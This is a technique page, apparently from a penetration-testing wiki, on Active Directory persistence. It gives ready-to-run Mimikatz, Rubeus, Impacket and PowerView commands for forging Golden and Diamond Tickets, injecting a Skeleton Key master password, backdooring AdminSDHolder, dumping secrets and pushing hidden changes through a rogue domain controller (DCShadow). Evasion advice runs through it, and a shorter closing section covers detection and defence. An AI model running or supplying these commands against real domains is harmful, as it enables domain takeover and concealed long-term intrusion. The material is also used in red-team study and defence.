---
title: Active Directory Persistence Techniques
category: techniques
subcategory: active-directory
tags: [persistence, golden-ticket, diamond-ticket, skeleton-key, adminsdholder, dcshadow]
last_updated: 2025-12-27
---

# Active Directory Persistence Techniques

## Table of Contents

- [Overview](#overview)
- [Golden Ticket](#golden-ticket)
- [Diamond Ticket](#diamond-ticket)
- [Skeleton Key](#skeleton-key)
- [AdminSDHolder Abuse](#adminsdholder-abuse)
- [DCShadow](#dcshadow)
- [Detection and Defense](#detection-and-defense)
- [References](#references)

## Overview

Persistence in Active Directory ensures continued access even after password changes or security remediations. These techniques require existing high-level access and are used to maintain domain dominance.

**Categories:**
- Forged Tickets: Golden Ticket, Diamond Ticket
- Memory-based: Skeleton Key
- Object Manipulation: AdminSDHolder, DCShadow

---

## Golden Ticket

### Description

Golden Tickets are forged TGTs encrypted with the KRBTGT account's password hash. They provide unrestricted domain access and persist until KRBTGT is reset twice.

**Persistence Characteristics:**
- Survives user password changes
- Valid for configured lifetime (default 10 years)
- Requires KRBTGT reset twice to invalidate
- Can impersonate any user including non-existent ones

### Requirements

- KRBTGT NTLM hash or AES key
- Domain SID
- Domain name

### Creating Persistent Golden Ticket

```
# Mimikatz - Create long-lived Golden Ticket
kerberos::golden /user:PeristentAdmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:KRBTGT_HASH /id:500 /groups:512,513,518,519,520 /ticket:golden_persistent.kirbi

# Parameters for persistence:
# /id:500 - Administrator RID
# /groups: - Domain Admins (512), Domain Users (513), Schema Admins (518), Enterprise Admins (519), Group Policy Creator Owners (520)
```

```bash
# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local -duration 3650 Administrator
```

### Storing and Reusing

```powershell
# Store ticket securely
# Ticket files (.kirbi, .ccache) contain the forged TGT

# Reuse on Windows
kerberos::ptt golden_persistent.kirbi

# Reuse on Linux
export KRB5CCNAME=golden.ccache
psexec.py -k -no-pass domain.local/Administrator@dc01.domain.local
```

---

## Diamond Ticket

### Description

Diamond Tickets are a stealthier evolution of Golden Tickets. Instead of forging entirely new TGTs, they modify legitimate TGTs by decrypting, modifying the PAC, and re-encrypting.

**Advantages over Golden Ticket:**
- Uses real ticket metadata (not fabricated)
- Harder to detect due to legitimate ticket attributes
- PAC modifications blend with normal behavior

### Requirements

- KRBTGT AES key (AES256 preferred)
- Valid user's TGT
- Domain SID

### Creating Diamond Ticket

```powershell
# Rubeus - Request TGT and modify it
.\Rubeus.exe diamond /krbkey:KRBTGT_AES256 /user:regularuser /password:pass /enctype:aes /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt

# From existing ticket
.\Rubeus.exe diamond /krbkey:KRBTGT_AES256 /tgtdeleg /enctype:aes /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
```

**Parameters:**
- `/krbkey:` - KRBTGT AES256 key
- `/ticketuser:` - User to impersonate
- `/ticketuserid:` - Target user RID
- `/groups:` - Group RIDs to add
- `/enctype:aes` - Use AES encryption (stealthier)

### Comparison: Golden vs Diamond

| Attribute | Golden Ticket | Diamond Ticket |
|-----------|--------------|----------------|
| Ticket Source | Completely forged | Modified legitimate TGT |
| Detection | Metadata anomalies | Much harder to detect |
| Ticket Lifetime | Can be arbitrary | Matches policy |
| Event 4768 | No corresponding event | Has legitimate event |
| Key Required | NTLM or AES | AES (required) |

---

## Skeleton Key

### Description

Skeleton Key patches LSASS on Domain Controllers to add a master password that works for any account while normal passwords still function.

**Characteristics:**
- Master password works for all accounts
- Users can still log in with real passwords
- Memory-based (cleared on DC reboot)
- Requires Domain Admin and SeDebugPrivilege

### Installation

```
# Mimikatz on Domain Controller
privilege::debug
misc::skeleton

# Default skeleton key password: mimikatz
```

### Using Skeleton Key

```bash
# Authenticate with skeleton password
psexec.py domain.local/Administrator:mimikatz@DC01

# Works for any user
smbclient.py domain.local/anyuser:mimikatz@TARGET
```

### Persistence Considerations

- Cleared on DC reboot
- Must be re-injected after restart
- Deploy on multiple DCs for redundancy
- Consider scheduled task to re-inject

### Remote Skeleton Key

```
# Mimikatz
misc::skeleton /patch

# Using Invoke-Mimikatz remotely
Invoke-Mimikatz -Command '"misc::skeleton"' -ComputerName DC01
```

---

## AdminSDHolder Abuse

### Description

AdminSDHolder is a container whose ACL is copied to protected groups (Domain Admins, Enterprise Admins, etc.) every 60 minutes by SDProp. Modifying AdminSDHolder's ACL grants persistent access to all protected objects.

**Protected Groups:**
- Domain Admins, Enterprise Admins
- Schema Admins, Administrators
- Account Operators, Server Operators
- Backup Operators, Print Operators
- Domain Controllers, Read-only Domain Controllers
- KRBTGT

### Exploitation

**Step 1: Add Backdoor ACE to AdminSDHolder**
```powershell
# PowerView - Grant full control to attacker
Add-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights All -Verbose

# Specific rights
Add-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync

# Using AD Module
$acl = Get-Acl "AD:\CN=AdminSDHolder,CN=System,DC=domain,DC=local"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.IdentityReference]"DOMAIN\attacker",
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)
$acl.AddAccessRule($ace)
Set-Acl "AD:\CN=AdminSDHolder,CN=System,DC=domain,DC=local" $acl
```

**Step 2: Wait for SDProp (or Force It)**
```powershell
# Force SDProp to run (requires Domain Admin)
Invoke-ADSDPropagation

# Or wait up to 60 minutes
# After SDProp runs, attacker has rights on all protected groups
```

**Step 3: Abuse the Persistent Access**
```powershell
# Now backdooruser can modify Domain Admins
Add-DomainGroupMember -Identity "Domain Admins" -Members backdooruser

# Or DCSync if DCSync rights were granted
secretsdump.py domain.local/backdooruser:password@DC01
```

### Cleanup Detection

```powershell
# View AdminSDHolder ACL
Get-DomainObjectAcl -SearchBase "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -ResolveGUIDs |
  ? {$_.SecurityIdentifier -notmatch "S-1-5-21-.*-512|S-1-5-32-544"}
```

---

## DCShadow

### Description

DCShadow temporarily registers a rogue Domain Controller to inject arbitrary changes into AD via replication. Changes made through replication don't generate typical security logs.

**Characteristics:**
- Changes replicate like legitimate DC updates
- Bypasses most logging and monitoring
- Requires Domain Admin/Enterprise Admin
- Two Mimikatz instances required

### Requirements

- Domain Admin or Enterprise Admin privileges
- Two Mimikatz sessions (one as SYSTEM on DC)

### Execution

**Instance 1: Register Rogue DC and Push Changes**
```
# Run as SYSTEM on domain-joined machine
privilege::debug

# Set changes to make
lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512

# Other examples
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=local /attribute:ntSecurityDescriptor /value:<SD_bytes>
lsadump::dcshadow /object:CN=targetuser,CN=Users,DC=domain,DC=local /attribute:SIDHistory /value:S-1-5-21-xxx-500
```

**Instance 2: Push the Changes (on actual DC)**
```
# Run as Domain Admin
lsadump::dcshadow /push
```

### Attack Scenarios

**1. Add User to Domain Admins (via primaryGroupID):**
```
lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512
```

**2. Grant DCSync Rights via AdminSDHolder:**
```
# Modify AdminSDHolder ACL
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=local /attribute:ntSecurityDescriptor /value:<modified_SD>
```

**3. Inject SID History:**
```
lsadump::dcshadow /object:backdoor /attribute:SIDHistory /value:S-1-5-21-xxx-512
```

**4. Modify KRBTGT for Golden Ticket Persistence:**
```
# Not recommended (very noisy and destructive)
```

### Stealth Considerations

- Changes don't appear in normal event logs
- No Event 4662 for object modifications
- Appears as legitimate DC replication
- Only detectable via replication traffic analysis

---

## Detection and Defense

### Detection Methods

| Technique | Detection |
|-----------|-----------|
| Golden Ticket | TGT with unusual lifetime, no matching 4768, metadata anomalies |
| Diamond Ticket | Very difficult - requires deep packet inspection |
| Skeleton Key | LSASS memory analysis, behavioral anomalies |
| AdminSDHolder | Event 5136 on AdminSDHolder, ACL auditing |
| DCShadow | SPN changes, new nTDSDSA objects, replication anomalies |

### Key Event IDs

| Event ID | Description |
|----------|-------------|
| 4768 | TGT request (missing for Golden Ticket) |
| 5136 | Directory object modified |
| 4742 | Computer account changed (DCShadow) |
| 4929 | AD replication source DC naming context removed |

### DCShadow Detection

- Monitor for temporary computer accounts with DC SPNs
- Watch for replication from non-DC sources
- Alert on nTDSDSA object creation
- Monitor Event IDs 4928, 4929 (replication)

### Defensive Measures

**Golden/Diamond Ticket:**
```powershell
# Reset KRBTGT password twice (12-24 hours apart)
# First reset
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "RandomPass1!" -AsPlainText -Force)

# Wait 12-24 hours, then second reset
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "RandomPass2!" -AsPlainText -Force)
```

**Skeleton Key:**
- Reboot DCs to clear memory-based persistence
- Enable Credential Guard on DCs
- Monitor LSASS for unexpected patches
- Use LSA Protection (PPL)

**AdminSDHolder:**
```powershell
# Audit AdminSDHolder ACL regularly
Get-ADObject "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -Properties nTSecurityDescriptor

# Alert on modifications (Event 5136)
```

**DCShadow:**
- Monitor for DC SPN additions on non-DC computers
- Alert on nTDSDSA object changes
- Use network monitoring for unusual replication
- Implement DNSSEC to prevent DC spoofing

**General:**
- Use Protected Users group for privileged accounts
- Implement tiered administration
- Regular AD security assessments
- Deploy Microsoft Defender for Identity

---

## References

- [MITRE ATT&CK - Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
- [The Hacker Recipes - Diamond Ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond)
- [The Hacker Recipes - Skeleton Key](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [Netwrix - DCShadow Attack](https://www.netwrix.com/how_dcshadow_persistence_attack_works.html)
- [SpecterOps - AdminSDHolder](https://posts.specterops.io/)
- [Core Security - Persistence Techniques](https://www.coresecurity.com/blog/getting-inside-mind-attacker-after-breach-achieving-persistence-misc-techniques)
